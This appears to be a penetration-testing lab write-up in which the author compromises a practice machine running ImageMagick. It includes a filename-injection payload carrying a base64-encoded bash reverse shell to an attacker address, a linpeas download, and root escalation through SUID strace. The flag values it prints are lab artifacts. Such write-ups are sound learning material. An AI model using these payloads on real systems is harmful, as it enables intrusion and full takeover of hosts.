---
title: Image
date: 2025-11-09
---
# System Information
IP: 192.168.192.178
OS: Linux, Ubuntu 20.04.6 LTS
Architecture: x64

This will be my first time using the Penelope shell handler and I can't wait, it brings some awesome quality of life features. https://github.com/brightio/penelope

---
# Service Discovery

## Open Ports & Priority
TCP Ports:
- [x] 80
- [ ] 22

# Initial Access
## 80
ImageMagick Identifier

Version: 6.9.6-4

![[Pasted image 20251109092145.png]]

https://github.com/ImageMagick/ImageMagick/issues/6339

If we can achieve code execution, we can establish a reverse shell.

`|image"`CODE GOES HERE`".png`

I'll start a listener with penelope and insert the the Bash TCP payload into the filename.

`penelope -a`
![[Pasted image 20251109093518.png]]

Thus, I have a file named:
`|image"`printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4yNDYvNDQ0NCAwPiYxKSAm|base64 -d|bash`".png`

*Using a base64 encoded payload like this is not only convenient because penelope prints it automatically, but it also circumvents the need to find a payload that doesn't cause issues with filesystem naming restrictions, for instance not being allowed to include slashes.*

Once I upload this file, I catch a shell on my listener as www-data!

![[Pasted image 20251109094049.png]]

# Privilege Escalation

For the sake of learning penelope better, I'll try to leverage its features rather than doing file transfers my typical way (python3 -m http.server 80 and curl).

I'll use F12 to detach from the session and open our menu.

![[Pasted image 20251109094502.png]]

We can use `help run` to display the built-in modules. peass_ng sounds amazing.

`run peass_ng`
It switfly downloads from https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh, transfers to the target, and runs in a new window, so we still have our interactive session available to use as well. Impressive!!

While that's running, I decided to start some quick manual checks as well.
`find / -perm -u=s -type f 2>/dev/null`

`/usr/bin/strace` catches my attention as it doesn't typically have SUID.

Referring to https://gtfobins.github.io/gtfobins/strace/#suid we can elevate to root by running:
`strace -o /dev/null /bin/sh -p`

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

/var/www/local.txt: 233df900ce0620da07be54666983d59f
/root/proof.txt: 483c5bf2ecca44c6f5076ec0b166879c

![[Pasted image 20251109095508.png]]
